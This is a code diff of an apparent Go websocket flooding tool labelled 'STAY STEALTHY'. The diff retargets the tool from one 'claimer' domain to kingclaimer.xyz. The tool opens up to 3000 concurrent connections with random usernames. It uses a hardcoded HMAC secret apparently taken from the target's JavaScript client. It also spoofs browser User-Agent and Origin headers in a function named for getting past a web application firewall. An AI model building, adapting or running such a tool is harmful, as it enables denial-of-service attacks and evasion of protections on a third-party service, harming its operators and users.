@@ -28,14 +28,14 @@ import (
 // CONFIGURATION (STAY STEALTHY)
 // ==========================================
 var (
-	SERVER_URL     = getEnv("TARGET_URL", "wss://api.vipclaimer.online/ws")
+	SERVER_URL     = getEnv("TARGET_URL", "wss://kingclaimer.xyz:8443/")
 	TOTAL_CLIENTS  = 3000
 	MAX_WORKERS    = 3000
 	RECONNECT_DELAY = 1 * time.Second
 	serverIP       string
 )
 
-// Shared Secret from JS Claimer
+// Shared Secret (Update if backend changed it)
 const SHARED_SECRET = "vipxK9mP2vL8nQ4wRjT5bYc"
 
 var workerSemaphore = make(chan struct{}, MAX_WORKERS)
@@ -66,10 +66,10 @@ func getEnv(key, defaultValue string) string {
 }
 
 // ==========================================
-// HMAC TOKEN GENERATION (Exact JS Logic Ported)
+// HMAC TOKEN GENERATION
 // ==========================================
 func getServerTime() (int64, error) {
-	resp, err := http.Get("https://api.vipclaimer.online/api/server-time")
+	resp, err := http.Get("https://kingclaimer.xyz/api/server-time")
 	if err != nil {
 		return 0, err
 	}
@@ -100,7 +100,6 @@ func generateHMACAuthToken(username string) (string, error) {
 
 	message := fmt.Sprintf("%s:%d", username, serverTime)
 	key := []byte(SHARED_SECRET)
-
 	h := hmac.New(sha256.New, key)
 	h.Write([]byte(message))
 	signature := hex.EncodeToString(h.Sum(nil))
@@ -134,14 +133,13 @@ func NewStressClient(id int) *StressClient {
 func getWAFHeaders() http.Header {
 	headers := http.Header{}
 	headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
-	headers.Add("Origin", "https://stake.com")
+	headers.Add("Origin", "https://kingclaimer.xyz")
 	return headers
 }
 
 func (c *StressClient) Connect() bool {
 	c.username = generateRandomUsername()
 
-	// Generate HMAC Token (Kept for compatibility)
 	authToken, err := generateHMACAuthToken(c.username)
 	if err != nil {
 		log.Printf("[Client %d] Failed to generate auth token", c.clientID)
@@ -197,12 +195,12 @@ func (c *StressClient) Connect() bool {
 		log.Printf("\n[+] SERVER WELCOME: %s\n", string(welcomeMsg))
 	})
 
-	// Register - Simplified to match new server log (only username)
+	// Register (New backend method)
 	regPayload := map[string]interface{}{
 		"type":     "register",
 		"role":     "claimer",
 		"username": c.username,
-		// "token": authToken,  // Commented out - new server rejects complex auth
+		// Token is sent via query param (nonce), not in payload for new backend
 	}
 
 	err = ws.WriteJSON(regPayload)
@@ -221,7 +219,6 @@ func (c *StressClient) Connect() bool {
 	c.lock.Unlock()
 
 	log.Printf("[Client %d] Logged in as: %s", c.clientID, c.username)
-
 	go c.writePump()
 	return true
 }
